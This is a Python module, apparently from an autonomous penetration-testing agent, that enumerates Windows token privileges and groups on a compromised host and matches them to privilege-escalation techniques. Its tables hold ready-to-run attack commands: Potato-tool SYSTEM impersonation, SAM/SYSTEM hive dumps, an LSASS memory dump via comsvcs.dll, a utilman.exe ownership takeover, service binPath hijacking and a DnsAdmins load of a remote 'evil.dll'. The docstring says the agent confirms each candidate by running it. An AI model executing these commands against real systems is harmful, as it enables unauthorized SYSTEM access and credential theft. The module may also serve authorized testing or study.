"""Phase 8b — Windows local privilege escalation via token privileges & groups.

The Linux matcher (privesc.py) maps sudo/SUID/capabilities against GTFOBins. Its
Windows counterpart maps the *token privileges* a shell holds (`whoami /priv`) and
powerful *group memberships* (`whoami /groups`) against the well-known local-to-SYSTEM
techniques — the Potato family for SeImpersonate, hive theft for SeBackup, LSASS dump
for SeDebug, and so on. Enumeration runs on an already-owned Windows host (through
`ad_exec`/nxc, or any interactive shell); the agent confirms a candidate by running it
and checking for `nt authority\\system`.

Unlike GTFOBins there is no upstream JSON to fetch — the mapping of privilege→technique
is small, stable, and curated here. Reference: gtworek/Priv2Admin.

ponytail: covers the privileges/groups that lead to SYSTEM or credential theft on a
default host; kernel-exploit and third-party-service abuse stay with the model's
reasoning (it has the enumeration output and LOLBAS in the RAG).
"""
from __future__ import annotations

import re

PRIV2ADMIN = "https://github.com/gtworek/Priv2Admin"

# Enumeration run on the owned Windows host. Each value is a command (cmd.exe).
ENUM = {
    "whoami": "whoami",
    "priv": "whoami /priv",
    "groups": "whoami /groups",
    "localadmins": "net localgroup administrators",
}

# Token privileges that lead to SYSTEM or credential theft. A privilege shown as
# "Disabled" by `whoami /priv` is still abusable — it can be enabled programmatically
# within the process — so a present privilege is always a candidate; its state is
# reported for context.
PRIV_TECHNIQUES: dict[str, dict] = {
    "SeImpersonatePrivilege": {
        "technique": "Potato: coerce a privileged auth and impersonate its SYSTEM token",
        "tools": ["PrintSpoofer", "GodPotato", "JuicyPotatoNG", "RoguePotato"],
        "run": "PrintSpoofer64.exe -i -c cmd.exe",
        "impact": "SYSTEM",
    },
    "SeAssignPrimaryTokenPrivilege": {
        "technique": "Potato: assign a stolen SYSTEM token as the primary token of a new process",
        "tools": ["GodPotato", "JuicyPotatoNG", "RoguePotato"],
        "run": "GodPotato.exe -cmd \"cmd /c whoami\"",
        "impact": "SYSTEM",
    },
    "SeBackupPrivilege": {
        "technique": "Read any file: dump the SAM/SYSTEM/SECURITY hives, then secretsdump offline",
        "tools": ["reg save", "robocopy /b", "impacket-secretsdump"],
        "run": "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive",
        "impact": "credential theft -> local admin",
    },
    "SeRestorePrivilege": {
        "technique": "Write any file/key: overwrite a service binary or set a service ImagePath to your payload",
        "tools": ["reg", "copy"],
        "run": "overwrite a SYSTEM-run binary/service ImagePath, then (re)start the service",
        "impact": "SYSTEM",
    },
    "SeTakeOwnershipPrivilege": {
        "technique": "Take ownership of a privileged file/key, grant yourself write, then replace it",
        "tools": ["takeown", "icacls"],
        "run": "takeown /f C:\\Windows\\System32\\utilman.exe & icacls utilman.exe /grant %USERNAME%:F",
        "impact": "SYSTEM",
    },
    "SeDebugPrivilege": {
        "technique": "Open any process: dump LSASS for credentials, or inject into a SYSTEM process",
        "tools": ["comsvcs.dll MiniDump", "procdump", "mimikatz"],
        "run": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full",
        "impact": "credential theft / SYSTEM",
    },
    "SeLoadDriverPrivilege": {
        "technique": "Load a known-vulnerable signed driver and exploit it for kernel code execution",
        "tools": ["EoPLoadDriver", "Capcom.sys"],
        "run": "load a vulnerable signed driver via the registry, then trigger the kernel bug",
        "impact": "kernel -> SYSTEM",
    },
    "SeManageVolumePrivilege": {
        "technique": "Gain full control of the volume, then drop a hijack DLL into a SYSTEM service's path",
        "tools": ["SeManageVolumeExploit"],
        "run": "obtain full access to C:\\, plant a DLL a SYSTEM service loads",
        "impact": "SYSTEM",
    },
    "SeCreateTokenPrivilege": {
        "technique": "Forge a token containing the SYSTEM / Administrators SIDs (NtCreateToken) and impersonate it",
        "tools": ["NtCreateToken PoC"],
        "run": "craft a token with S-1-5-18 and impersonate it",
        "impact": "SYSTEM",
    },
    "SeTcbPrivilege": {
        "technique": "Act as part of the OS: build and impersonate a token with arbitrary group membership",
        "tools": ["custom LogonUser/token PoC"],
        "run": "construct a SYSTEM token and impersonate it",
        "impact": "SYSTEM",
    },
}

# Group memberships that are local-admin-equivalent or a known direct path to SYSTEM.
# Matched on the group's short name appearing in `whoami /groups`.
GROUP_TECHNIQUES: dict[str, dict] = {
    "Backup Operators": {
        "technique": "Read/write any file: dump the SAM/SYSTEM hives (as SeBackupPrivilege)",
        "run": "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive",
        "impact": "credential theft -> local admin",
    },
    "Server Operators": {
        "technique": "Reconfigure a service binPath to your payload and restart it (runs as SYSTEM)",
        "run": "sc config <svc> binPath= \"cmd /c <payload>\" & sc start <svc>",
        "impact": "SYSTEM",
    },
    "DnsAdmins": {
        "technique": "Load an arbitrary DLL into the DNS service (SYSTEM) via ServerLevelPluginDll",
        "run": "dnscmd /config /serverlevelplugindll \\\\host\\share\\evil.dll & restart dns",
        "impact": "SYSTEM (on the DNS server / DC)",
    },
    "Hyper-V Administrators": {
        "technique": "Full control of VMs and host surfaces -> local SYSTEM",
        "run": "abuse VM/host management to run code as SYSTEM",
        "impact": "SYSTEM",
    },
    "Print Operators": {
        "technique": "Holds SeLoadDriverPrivilege: load a malicious/vulnerable driver",
        "run": "load a vulnerable signed driver, then trigger the kernel bug",
        "impact": "kernel -> SYSTEM",
    },
    "Account Operators": {
        "technique": "Modify most non-protected accounts/groups to seize privileged access",
        "run": "add a controlled user to a privileged (non-protected) group",
        "impact": "privileged account takeover",
    },
}

_PRIV_RE = re.compile(r"(Se\w+Privilege)\b.*?(Enabled|Disabled)?\s*$", re.M)


def enumerate_host(run) -> dict:
    """run: a callable(command)->output (the Windows exec channel). Returns a profile."""
    return {k: run(cmd) for k, cmd in ENUM.items()}


def _privs(text: str) -> list[tuple[str, str]]:
    """Parse `whoami /priv` → [(SePrivilegeName, 'Enabled'|'Disabled'|'')]."""
    out = []
    for m in _PRIV_RE.finditer(text or ""):
        out.append((m.group(1), m.group(2) or ""))
    return out


def candidates(profile: dict) -> list[dict]:
    """Match token privileges and group memberships against known SYSTEM/cred paths."""
    found, seen = [], set()

    def add(kind, name, info, state=""):
        if name in seen:
            return
        seen.add(name)
        found.append({
            "kind": kind, "name": name, "state": state,
            "technique": info["technique"], "run": info["run"],
            "impact": info["impact"], "tools": info.get("tools", []),
            "url": PRIV2ADMIN,
        })

    for name, state in _privs(profile.get("priv", "")):
        if name in PRIV_TECHNIQUES:
            add("privilege", name, PRIV_TECHNIQUES[name], state)

    groups = profile.get("groups", "") or ""
    for name, info in GROUP_TECHNIQUES.items():
        if name.lower() in groups.lower():
            add("group", name, info)

    return found


if __name__ == "__main__":  # offline self-check: python -m watson.winprivesc
    priv_out = (
        "PRIVILEGES INFORMATION\n----------------------\n"
        "Privilege Name                Description                     State\n"
        "============================= =============================== ========\n"
        "SeImpersonatePrivilege        Impersonate a client            Enabled\n"
        "SeBackupPrivilege             Back up files and directories   Disabled\n"
        "SeChangeNotifyPrivilege       Bypass traverse checking        Enabled\n"
    )
    groups_out = (
        "GROUP INFORMATION\n-----------------\n"
        "BUILTIN\\Users                 Alias   S-1-5-32-545 ...\n"
        "BUILTIN\\Backup Operators      Alias   S-1-5-32-551 ...\n"
        "CORP\\DnsAdmins                Group   S-1-5-21-... ...\n"
    )
    profile = {"priv": priv_out, "groups": groups_out}
    cands = candidates(profile)
    names = {c["name"] for c in cands}

    # token privileges matched (enabled AND disabled), noise ignored
    assert "SeImpersonatePrivilege" in names and "SeBackupPrivilege" in names, names
    assert "SeChangeNotifyPrivilege" not in names, "benign privilege must not match"
    imp = next(c for c in cands if c["name"] == "SeImpersonatePrivilege")
    assert imp["state"] == "Enabled" and imp["impact"] == "SYSTEM"
    assert "PrintSpoofer" in imp["tools"] and imp["kind"] == "privilege"
    assert next(c for c in cands if c["name"] == "SeBackupPrivilege")["state"] == "Disabled"

    # powerful groups matched by short name inside the /groups dump
    assert "Backup Operators" in names and "DnsAdmins" in names, names
    assert next(c for c in cands if c["name"] == "DnsAdmins")["kind"] == "group"

    # a clean low-priv shell yields nothing
    assert candidates({"priv": "SeChangeNotifyPrivilege Bypass Enabled", "groups": "BUILTIN\\Users"}) == []

    prof = enumerate_host(lambda c: "whoami /priv" if c == "whoami /priv" else "")
    assert set(prof) == set(ENUM)
    print(f"winprivesc self-check ok  ({len(cands)} candidates from the sample)")
